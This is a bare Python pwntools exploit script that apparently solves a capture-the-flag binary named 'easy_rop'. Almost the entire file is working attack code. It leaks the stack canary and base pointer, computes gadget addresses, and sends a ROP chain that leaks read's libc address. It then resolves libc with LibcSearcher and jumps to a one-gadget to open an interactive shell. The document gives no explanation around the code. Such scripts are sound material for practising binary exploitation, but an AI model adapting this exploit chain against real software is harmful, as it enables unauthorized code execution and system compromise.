from pwn import*
from LibcSearcher import*
p = process('./easy_rop')
elf = ELF('./easy_rop')
context.log_level  = 'debug'
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
read_got = elf.got['read']
def leak():
	p.sendlineafter(': ','+')
	p.recvuntil(' = ')
	var_one = int(p.recvuntil('\n'))&0xFFFFFFFF
	p.sendlineafter(': ','-')
	p.recvuntil(' = ')
	var_two = (int(p.recvuntil('\n'))&0xFFFFFFFF)*0x100000000
	return (var_one + var_two)
def Set(address):
	p.sendlineafter(': ',str((address%0x100000000)))
	p.sendlineafter(': ',str(address/0x100000000))

List = []
for i in range(0,15):
	List.append(leak())
log.success('Canary:\t' + hex(List[13]))
log.success('RBP:\t'+hex(List[14]))

base = List[14] - 0xB40
main_addr = base + 0xA31
migrate_addr = base + 0x201420
pop_rdi_ret = base +0xBA3
pop_rsi_ret = base +0xBA1
gadget_one = base + 0xB9A
gadget_two = base + 0xB80

Set(base+0xB9D)
Set(base+0x201408)

p.recvuntil('name?\n')
rop = p64(pop_rdi_ret) + p64(base+0x201258) + p64(base+0x810) + p64(gadget_one) + p64(0) + p64(1) + p64(base+0x201258) + p64(9) + p64(base+0x201238) + p64(0)
rop += p64(gadget_two) + p64(0) * (6 + 1) + p64(base+0x810)
p.sendline(rop)
read_addr = u64(p.recvuntil('\n',drop =True).ljust(8,'\x00'))
log.success('Read_Addr:\t' + hex(read_addr))
libc = LibcSearcher('read',read_addr)
libcbase = read_addr - libc.dump('read')
exec_addr = libcbase + 0xE569F
p.sendline(p64(exec_addr))
p.interactive()



